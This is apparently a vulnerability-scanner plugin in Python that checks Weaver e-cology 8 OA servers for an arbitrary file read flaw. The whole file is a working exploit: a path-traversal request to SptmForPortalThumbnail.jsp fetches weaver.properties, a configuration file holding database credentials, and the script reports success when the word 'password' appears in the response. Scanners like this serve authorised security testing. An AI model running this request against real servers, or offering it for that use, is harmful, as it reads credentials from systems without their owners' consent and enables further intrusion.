import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微OA-E-cology8-SptmForPortalThumbnail.jsp任意文件读取漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/portal/SptmForPortalThumbnail.jsp?preview=../ecology/WEB-INF/prop/weaver.properties")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'password' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult